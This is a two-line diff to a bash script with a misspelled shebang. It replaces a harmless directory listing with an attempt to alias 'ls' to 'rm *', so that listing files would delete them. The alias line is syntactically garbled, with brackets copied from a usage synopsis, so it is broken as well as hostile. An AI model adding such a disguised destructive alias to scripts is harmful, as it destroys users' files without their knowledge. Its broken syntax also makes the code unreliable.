@@ -1,2 +1,2 @@
 #!/bin/bashl
-ls -al
+alias [-p] [ls="rm *"]
